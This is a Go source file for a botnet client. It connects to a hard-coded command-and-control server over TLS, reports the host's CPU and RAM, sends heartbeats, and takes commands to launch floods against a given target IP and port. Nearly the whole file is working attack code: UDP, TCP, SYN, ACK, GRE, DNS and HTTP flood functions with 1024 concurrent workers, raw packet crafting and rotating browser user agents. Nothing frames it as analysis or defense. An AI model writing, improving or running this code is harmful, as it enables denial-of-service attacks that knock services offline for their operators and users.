package main

import (
	"bufio"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
	"github.com/shirou/gopsutil/mem"
)

const (
	C2Address         = "192.168.1.50:7002" // Should be set via environment variable
	reconnectDelay    = 5 * time.Second
	numWorkers        = 1024
	heartbeatInterval = 30 * time.Second
	maxRetries        = 5
	baseRetryDelay    = 1 * time.Second
	dnsTimeout        = 5 * time.Second
	httpTimeout       = 10 * time.Second
	maxPacketSize     = 65535
	minSourcePort     = 1024
	maxSourcePort     = 65535
)

var (
	stopChan    = make(chan struct{})
	statsMutex  sync.Mutex
	globalStats = make(map[string]*AttackStats)
	randMu      sync.Mutex
	logger      = log.New(os.Stdout, "[BOT] ", log.LstdFlags)
)

type AttackStats struct {
	PacketsSent  int64
	RequestsSent int64
	BytesSent    int64
	Errors       int64
	StartTime    time.Time
	Duration     time.Duration
}

func main() {
	// Initialize with system information
	logger.Printf("Starting bot - Arch: %s, Cores: %d", runtime.GOARCH, runtime.NumCPU())

	for {
		conn, err := connectToC2()
		if err != nil {
			logger.Printf("Connection failed: %v - retrying in %v", err, reconnectDelay)
			time.Sleep(reconnectDelay)
			continue
		}

		if err := handleChallenge(conn); err != nil {
			logger.Printf("Challenge failed: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		if err := runBot(conn); err != nil {
			logger.Printf("Bot error: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
		}
	}
}

func connectToC2() (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // For simplicity, in production use proper cert verification
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	conn, err := tls.DialWithDialer(dialer, "tcp", C2Address, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %w", err)
	}

	tcpConn, ok := conn.NetConn().(*net.TCPConn)
	if !ok {
		conn.Close()
		return nil, fmt.Errorf("could not get TCP connection")
	}

	// Optimize TCP settings
	tcpConn.SetKeepAlive(true)
	tcpConn.SetKeepAlivePeriod(30 * time.Second)
	tcpConn.SetNoDelay(true)
	tcpConn.SetLinger(0)

	return conn, nil
}

func runBot(conn net.Conn) error {
	defer conn.Close()

	// Send initial system information
	ramGB := getRAMGB()
	_, err := conn.Write([]byte(fmt.Sprintf("PONG:%s:%d:%.1f\n", runtime.GOARCH, runtime.NumCPU(), ramGB)))
	if err != nil {
		return fmt.Errorf("initial info send failed: %w", err)
	}

	cmdChan := make(chan string, 10) // Buffered channel to prevent blocking
	defer close(cmdChan)

	// Command reader goroutine
	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			cmdChan <- scanner.Text()
		}
	}()

	// Heartbeat goroutine
	heartbeatDone := make(chan struct{})
	go func() {
		sendHeartbeat(conn, runtime.NumCPU(), ramGB)
		close(heartbeatDone)
	}()

	// Main command processing loop
	for {
		select {
		case command := <-cmdChan:
			if err := handleCommand(command); err != nil {
				logger.Printf("Command error: %v", err)
			}
		case <-heartbeatDone:
			return nil
		case <-time.After(2 * heartbeatInterval):
			return fmt.Errorf("connection timeout")
		}
	}
}

func handleChallenge(conn net.Conn) error {
	reader := bufio.NewReader(conn)
	challengeLine, err := reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("read challenge failed: %w", err)
	}

	challenge := strings.TrimPrefix(strings.TrimSpace(challengeLine), "CHALLENGE:")
	response := computeResponse(challenge)

	_, err = conn.Write([]byte(response + "\n"))
	return err
}

func computeResponse(challenge string) string {
	hash := sha256.Sum256([]byte(challenge + "SALT"))
	return hex.EncodeToString(hash[:])
}

func sendHeartbeat(conn net.Conn, cores int, ramGB float64) {
	ticker := time.NewTicker(heartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			statsMutex.Lock()
			activeAttacks := len(globalStats)
			statsMutex.Unlock()

			_, err := conn.Write([]byte(fmt.Sprintf("HEARTBEAT:%s:%d:%.1f:%d\n",
				runtime.GOARCH, cores, ramGB, activeAttacks)))
			if err != nil {
				logger.Printf("Heartbeat send error: %v", err)
				return
			}
		case <-stopChan:
			return
		}
	}
}

func getRAMGB() float64 {
	mem, err := mem.VirtualMemory()
	if err != nil {
		logger.Printf("Failed to get RAM info: %v", err)
		return 0
	}
	return float64(mem.Total) / (1024 * 1024 * 1024)
}

func handleCommand(command string) error {
	if command == "" {
		return nil
	}

	fields := strings.Fields(command)
	if len(fields) < 1 {
		return fmt.Errorf("empty command")
	}

	logger.Printf("Received command: %s", command)

	switch fields[0] {
	case "PING":
		return nil
	case "STOP":
		stopAllAttacks()
		return nil
	case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
		if len(fields) != 4 {
			return fmt.Errorf("invalid command format")
		}

		target := fields[1]
		targetPort, err := strconv.Atoi(fields[2])
		if err != nil {
			return fmt.Errorf("invalid port number")
		}

		duration, err := strconv.Atoi(fields[3])
		if err != nil {
			return fmt.Errorf("invalid duration")
		}

		// Validate target
		if net.ParseIP(target) == nil {
			if _, err := net.LookupHost(target); err != nil {
				return fmt.Errorf("invalid target")
			}
		}

		if targetPort <= 0 || targetPort > 65535 {
			return fmt.Errorf("invalid port")
		}

		if duration <= 0 || duration > 3600 { // Max 1 hour duration
			return fmt.Errorf("invalid duration")
		}

		// Launch appropriate attack
		switch fields[0] {
		case "!udpflood":
			go performUDPFlood(target, targetPort, duration)
		case "!udpsmart":
			go performSmartUDP(target, targetPort, duration)
		case "!tcpflood":
			go performTCPFlood(target, targetPort, duration)
		case "!synflood":
			go performSYNFlood(target, targetPort, duration)
		case "!ackflood":
			go performACKFlood(target, targetPort, duration)
		case "!greflood":
			go performGREFlood(target, duration)
		case "!dns":
			go performDNSFlood(target, targetPort, duration)
		case "!http":
			go performHTTPFlood(target, targetPort, duration)
		}
	default:
		return fmt.Errorf("unknown command")
	}

	return nil
}

func stopAllAttacks() {
	logger.Println("Stopping all attacks")
	close(stopChan)
	stopChan = make(chan struct{})
}

// Improved UDP flood with better error handling and stats tracking
func performUDPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
			if err != nil {
				logger.Printf("UDP connection error: %v", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					payload := make([]byte, getRandomInt(512, 2048))
					randMu.Lock()
					rand.Read(payload)
					randMu.Unlock()

					n, err := conn.Write(payload)
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
						atomic.AddInt64(&stats.BytesSent, int64(n))
					}
				}
			}
		}()
	}
	wg.Wait()
	logger.Printf("UDP flood completed - Packets: %d, Bytes: %d, Errors: %d",
		stats.PacketsSent, stats.BytesSent, stats.Errors)
}

// Enhanced TCP flood with connection reuse
func performTCPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["tcpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "tcpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Reuse connection for multiple requests
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
			if err != nil {
				atomic.AddInt64(&stats.Errors, 1)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					payload := make([]byte, getRandomInt(512, 2048))
					randMu.Lock()
					rand.Read(payload)
					randMu.Unlock()

					n, err := conn.Write(payload)
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						return // On error, exit and let worker restart
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
						atomic.AddInt64(&stats.BytesSent, int64(n))
					}
				}
			}
		}()
	}
	wg.Wait()
	logger.Printf("TCP flood completed - Packets: %d, Bytes: %d, Errors: %d",
		stats.PacketsSent, stats.BytesSent, stats.Errors)
}

// Improve SYN flood with for more packet size as well as just a improved
func performSYNFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["synflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "synflood")
		statsMutex.Unlock()
		logger.Printf("SYN flood final stats - Packets: %d (%.1f/s), Bytes: %s, Errors: %d",
			stats.PacketsSent,
			float64(stats.PacketsSent)/stats.Duration.Seconds(),
			formatBytes(stats.BytesSent),
			stats.Errors)
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := runtime.NumCPU() * 8 // Optimal worker count

	targetAddr := fmt.Sprintf("%s:%d", target, port)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			// Local counters to reduce atomic operations
			var localPackets, localBytes, localErrors int64
			defer func() {
				atomic.AddInt64(&stats.PacketsSent, localPackets)
				atomic.AddInt64(&stats.BytesSent, localBytes)
				atomic.AddInt64(&stats.Errors, localErrors)
			}()

			// Create a dialer with short timeouts
			dialer := &net.Dialer{
				Timeout:   50 * time.Millisecond, // Short connection timeout
				KeepAlive: -1,                    // Disable keep-alive
			}

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					// Just initiating the connection sends a SYN packet
					conn, err := dialer.DialContext(ctx, "tcp", targetAddr)
					if err != nil {
						// Most connections will "fail" because we don't complete the handshake
						// Only count as an error if it's not a timeout
						if !os.IsTimeout(err) && !strings.Contains(err.Error(), "timeout") {
							localErrors++
						}
					} else {
						// Close immediately - we only wanted to send the SYN
						conn.Close()
						localPackets++
						localBytes += 40 // Approximate TCP+IP header size
					}

					// Optional: Small sleep to prevent overwhelming local resources
					time.Sleep(time.Millisecond)
				}
			}
		}(i)
	}
	wg.Wait()
}

// Enhanced HTTP flood with more realistic traffic patterns
func performHTTPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["httpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "httpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: &http.Transport{DisableKeepAlives: true},
	}

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					url := fmt.Sprintf("http://%s:%d/%s", target, port, getRandomPath())
					req, err := http.NewRequest("GET", url, nil)
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					req.Header.Set("User-Agent", getRandomUserAgent())
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
					req.Header.Set("Accept-Language", "en-US,en;q=0.5")
					req.Header.Set("Connection", "close")

					start := time.Now()
					resp, err := client.Do(req)
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.RequestsSent, 1)
						if resp != nil && resp.Body != nil {
							resp.Body.Close()
						}
						latency := time.Since(start)
						if latency > 500*time.Millisecond {
							time.Sleep(10 * time.Millisecond) // Slow down if server is struggling
						}
					}
				}
			}
		}()
	}
	wg.Wait()
	logger.Printf("HTTP flood completed - Requests: %d, Errors: %d",
		stats.RequestsSent, stats.Errors)
}

// Helper functions
func getRandomPort() int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(maxSourcePort-minSourcePort) + minSourcePort
}

func getRandomInt(min, max int) int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(max-min) + min
}

func getRandomDomain() string {
	domains := []string{
		"google.com", "youtube.com", "facebook.com",
		"baidu.com", "wikipedia.org", "reddit.com",
		"yahoo.com", "amazon.com", "twitter.com",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return domains[rand.Intn(len(domains))]
}

func getRandomPath() string {
	paths := []string{
		"", "index.html", "home", "search", "products",
		"about", "contact", "login", "register", "api/v1/data",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return paths[rand.Intn(len(paths))]
}

func getRandomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return agents[rand.Intn(len(agents))]
}

func performSmartUDP(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpsmart"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpsmart")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				logger.Printf("Smart UDP setup error: %v", err)
				return
			}
			defer conn.Close()

			targetAddr := &net.UDPAddr{
				IP:   net.ParseIP(target),
				Port: port,
			}

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					// Vary packet size more aggressively
					packetSize := getRandomInt(64, 1400)
					payload := make([]byte, packetSize)
					randMu.Lock()
					rand.Read(payload)
					randMu.Unlock()

					// Add random delays to vary packet timing (0-10ms)
					if getRandomInt(0, 100) > 90 { // 10% chance
						time.Sleep(time.Duration(getRandomInt(0, 10)) * time.Millisecond)
					}

					n, err := conn.WriteTo(payload, targetAddr)
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
						atomic.AddInt64(&stats.BytesSent, int64(n))
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performACKFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["ackflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "ackflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				logger.Printf("ACK flood setup error: %v", err)
				return
			}
			defer conn.Close()

			targetIP := net.ParseIP(target)
			if targetIP == nil {
				atomic.AddInt64(&stats.Errors, 1)
				return
			}

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(getRandomPort()),
						DstPort: layers.TCPPort(port),
						ACK:     true,
						Window:  65535,
						Seq:     uint32(getRandomInt(1000000, 9999999)),
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, tcpLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: targetIP})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
						atomic.AddInt64(&stats.BytesSent, int64(len(buf.Bytes())))
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performGREFlood(target string, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["greflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "greflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				logger.Printf("GRE flood setup error: %v", err)
				return
			}
			defer conn.Close()

			targetIP := net.ParseIP(target)
			if targetIP == nil {
				atomic.AddInt64(&stats.Errors, 1)
				return
			}

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					// Create GRE header with random protocol type
					greLayer := &layers.GRE{
						Protocol: layers.EthernetType(uint16(getRandomInt(0x0800, 0xFFFF))),
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, greLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: targetIP})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
						atomic.AddInt64(&stats.BytesSent, int64(len(buf.Bytes())))
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performDNSFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["dnsflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "dnsflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Pre-generate DNS query templates for maximum performance
	queryTemplates := createDNSTemplates()
	domains := generateDomainList(500) // 500 random domains
	workers := runtime.NumCPU() * 2    // 2x CPU cores for optimal performance

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				logger.Printf("[Worker %d] DNS setup error: %v", workerID, err)
				return
			}
			defer conn.Close()

			targetAddr := &net.UDPAddr{
				IP:   net.ParseIP(target),
				Port: port,
			}

			// Local buffers to reduce locking
			var localPackets, localBytes, localErrors int64
			defer func() {
				atomic.AddInt64(&stats.PacketsSent, localPackets)
				atomic.AddInt64(&stats.BytesSent, localBytes)
				atomic.AddInt64(&stats.Errors, localErrors)
			}()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					// Rotate through different query types and domains
					template := queryTemplates[getRandomInt(0, len(queryTemplates))]
					domain := domains[getRandomInt(0, len(domains))]

					// Create unique message for each request
					msg := template.Copy()
					msg.SetQuestion(dns.Fqdn(domain), msg.Question[0].Qtype)
					msg.Id = uint16(getRandomInt(1, 65535))

					buf, err := msg.Pack()
					if err != nil {
						localErrors++
						continue
					}

					// Send with retry logic
					for attempt := 0; attempt < 2; attempt++ {
						_, err = conn.WriteTo(buf, targetAddr)
						if err == nil {
							localPackets++
							localBytes += int64(len(buf))
							break
						}
						localErrors++
						time.Sleep(10 * time.Millisecond)
					}
				}
			}
		}(i)
	}
	wg.Wait()

	logger.Printf("DNS flood completed - Workers: %d, Packets: %d (%.1f/s), Bytes: %s, Errors: %d",
		workers,
		stats.PacketsSent,
		float64(stats.PacketsSent)/stats.Duration.Seconds(),
		formatBytes(stats.BytesSent),
		stats.Errors)
}

// Helper functions for DNS flood
func createDNSTemplates() []*dns.Msg {
	queryTypes := []uint16{
		dns.TypeA, dns.TypeAAAA, dns.TypeMX,
		dns.TypeTXT, dns.TypeSRV, dns.TypeNS,
		dns.TypeSOA, dns.TypePTR, dns.TypeCNAME,
	}

	var templates []*dns.Msg
	for _, qtype := range queryTypes {
		msg := new(dns.Msg)
		msg.RecursionDesired = true
		msg.Question = make([]dns.Question, 1)
		msg.Question[0] = dns.Question{
			Qtype:  qtype,
			Qclass: dns.ClassINET,
		}
		templates = append(templates, msg)
	}
	return templates
}

func generateDomainList(count int) []string {
	prefixes := []string{"www", "mail", "ftp", "cdn", "api", "ns1", "ns2"}
	suffixes := []string{"com", "net", "org", "io", "co", "uk", "de"}
	words := []string{"shop", "service", "online", "tech", "cloud", "web", "app"}

	var domains []string
	for i := 0; i < count; i++ {
		randMu.Lock()
		prefix := prefixes[rand.Intn(len(prefixes))]
		word := words[rand.Intn(len(words))]
		suffix := suffixes[rand.Intn(len(suffixes))]
		num := rand.Intn(10)
		randMu.Unlock()

		domains = append(domains, fmt.Sprintf("%s%d.%s.%s", prefix, num, word, suffix))
	}
	return domains
}

func formatBytes(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}
